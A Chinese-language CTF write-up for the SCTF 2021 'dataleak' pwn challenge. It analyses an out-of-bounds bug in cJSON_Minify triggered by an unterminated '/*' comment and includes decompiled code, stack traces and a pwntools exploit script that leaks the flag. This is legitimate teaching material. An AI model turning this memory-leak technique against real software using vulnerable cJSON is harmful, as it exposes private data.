
---
title: sctf2021-pwn-dataleak-wp
categories: [CTF]
tags: [wp,pwn]

---
周末有事去了，等缓过来只搞个这个题的文件....<!--more-->

## 题目分析

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RPATH:    '/home/wlz/my_code/sctf_21/pwn_dataleak/src2ctfer/cmake-build-debug'
```

分析环境，发现题目没有开启canary,并且自带一个so文件。

分析主程序流程发现逻辑很简单，

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+Ch] [rbp-54h]
  __int64 buf; // [rsp+10h] [rbp-50h]
  __int64 v5; // [rsp+18h] [rbp-48h]
  __int64 v6; // [rsp+20h] [rbp-40h]
  __int64 v7; // [rsp+28h] [rbp-38h]
  __int64 v8; // [rsp+30h] [rbp-30h]
  __int64 v9; // [rsp+38h] [rbp-28h]
  __int64 v10; // [rsp+40h] [rbp-20h]
  char v11; // [rsp+48h] [rbp-18h]
  unsigned __int64 v12; // [rsp+58h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  for ( i = 0; i <= 1; ++i )
  {
    v8 = '_si_siht';
    v9 = '_ni_atad';
    v10 = 'revres';
    v11 = 0;
    buf = 0LL;
    v5 = 0LL;
    v6 = 0LL;
    v7 = 0LL;
    read(0, &buf, 0xEuLL);
    read(0, &v6, 0xEuLL);
    cJSON_Minify(&buf, &v6);
    write(1, &v6, 0xBuLL);
  }
  exit(0);
}
```

两次输入长度达0xe的字符串，然后放入`cJSON_Minify`函数进行处理。

`cJSON_Minify`函数在so文件中源码如下：

```c
char *__fastcall cJSON_Minify(char *a1)
{
  char *result; // rax
  char *v2; // rax
  char v3; // cl
  char *v4; // rax
  char *v5; // rax
  char v6; // cl
  _BYTE *v7; // rax
  char *v8; // rax
  char v9; // cl
  _BYTE *v10; // rax
  char *v11; // rax
  char v12; // cl
  _BYTE *v13; // rax
  char *v14; // rax
  char v15; // cl
  char *v16; // rax
  char *str_a1; // [rsp+0h] [rbp-18h]
  char *v18; // [rsp+0h] [rbp-18h]
  char *last; // [rsp+10h] [rbp-8h]
  signed __int64 v20; // [rsp+10h] [rbp-8h]

  str_a1 = a1;
  result = a1;
  last = a1;
  if ( a1 )
  {
    while ( *str_a1 )
    {
      switch ( *str_a1 )
      {
        case ' ':
          ++str_a1;
          break;
        case '\t':
          ++str_a1;
          break;
        case '\r':
          ++str_a1;
          break;
        case '\n':
          ++str_a1;
          break;
        default:
          if ( *str_a1 != '/' || str_a1[1] != '/' )
          {
            if ( *str_a1 != '/' || str_a1[1] != '*' )
            {
              if ( *str_a1 == '"' )
              {
                v2 = str_a1;
                v18 = str_a1 + 1;
                v3 = *v2;
                v4 = last;
                v20 = (signed __int64)(last + 1);
                *v4 = v3;
                while ( *v18 && *v18 != '"' )
                {
                  if ( *v18 == '\\' )
                  {
                    v5 = v18++;
                    v6 = *v5;
                    v7 = (_BYTE *)v20++;
                    *v7 = v6;
                  }
                  v8 = v18++;
                  v9 = *v8;
                  v10 = (_BYTE *)v20++;
                  *v10 = v9;
                }
                v11 = v18;
                str_a1 = v18 + 1;
                v12 = *v11;
                v13 = (_BYTE *)v20;
                last = (char *)(v20 + 1);
                *v13 = v12;
              }
              else
              {
                v14 = str_a1++;
                v15 = *v14;
                v16 = last++;
                *v16 = v15;
              }
            }
            else
            {
              while ( *str_a1 && (*str_a1 != '*' || str_a1[1] != '/') )
                ++str_a1;
              str_a1 += 2;
            }
          }
          else
          {
            while ( *str_a1 && *str_a1 != '\n' )
              ++str_a1;
          }
          break;
      }
    }
    result = last;
    *last = 0;
  }
  return result;
}
```

然后输出处理后，第二次输入的字符串的前8位。

## 漏洞点与利用

这里在`cJSON_Minify`函数中有个两个问题，第一个是越界(即`cJSON_Minify`第89-92行）：

```c
            {
              while ( *str_a1 && (*str_a1 != '*' || str_a1[1] != '/') )
                ++str_a1;
              str_a1 += 2;
            }
```

当字符串中有`\*`开头时，会不断遍历剩下字符直到遇到`\x00`或`*/`。但这里没有写仔细，如果遇到`*/`最后`str_a1 += 2;`是合理的但是遇到的是`\x00`

就有越界的风险。

第二个问题是在对一般字符处理时（即`cJSON_Minify`第81-84行）：

```
                v14 = str_a1++;
                v15 = *v14;
                v16 = last++;
                *v16 = v15;
```

在对正常字符处理时，`cJSON_Minify`函数`str_a1`处的数据放入`last`处，在正常情况下，str_a1的位置和last的位置是一样的。但是如果触发了问题一中的越界，那么`str_a1`指向我们字符串为`\x00`的位置还要+1的地方,而last处的还指向字符串的’/‘字符的位置。达成了，越界写。

就这个题目而言，如果我们输入的字符分别为：

```python
”xxxxxxxx/*oooo“ #第一次的字符串

”1234567890qqqq” #第二次字符串，v6
```

那么，在处理前栈上的数据为：

```
0x7ffc7f8d67b0: "xxxxxxxx/*oooo"
0x7ffc7f8d67bf: ""
0x7ffc7f8d67c0: "1234567890qqqq"
0x7ffc7f8d67cf: ""
0x7ffc7f8d67d0: "this_is_data_in_server"
```

在处理后，第一次字符串中的`/*oooo\x00`被替换成了第二个字符串中同等长度的字符`12345678`。

```
0x7ffc7f8d67b0: "xxxxxxxx1234567890qqqq"
0x7ffc7f8d67c7: "890qqqq"
0x7ffc7f8d67cf: ""
0x7ffc7f8d67d0: "this_is_data_in_server"
```

同时，若在第二次字符中还有 `/*`则将会在再次触发上面的步骤。

经过测试后发现

```
buf： xxxxxxxxxxxx/*   v6:1111/*qqqqqqqq

buf： xxxxx/*1111111    v6: /*qqqqqqqqqqqq
```

正好4次输入正好可以泄露出flag。

## exp

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/12/29 09:59:15
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./cJSON_PWN'
e=ELF(elf)
#context.log_level = 'debug'
context.arch=e.arch
ip_port=['',]

debug=lambda : gdb.attach(p) if local_mote==1 else Nonex

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])



debug()
x='s/*aaaaaaa'


x='/*'.rjust(0xe,'x')
y='1111/*'.ljust(0xe,'q')
print(x+y)
p.send(x+y)
x='/*1111111'.rjust(0xe,'x')
y='/*'.ljust(0xe,'q')
print(x+y)
p.send(x+y)
p.interactive()
```

## 后记-信息收集

在查阅这个题资料时发现这原理是一个信息收集题，orw...

搜索程序的文件可以看一个github项目：

![image-20211231165136223](image-20211231165136223.png)



这里就一个看到一个security报告。

![image-20211231165647957](image-20211231165647957.png)

这里就提到`/*`的报告，链接https://github.com/DaveGamble/cJSON/issues/338

![image-20211231170448565](image-20211231170448565.png)

## 后记

这个签到都这么有意思，其他题一定也都很有趣吧....

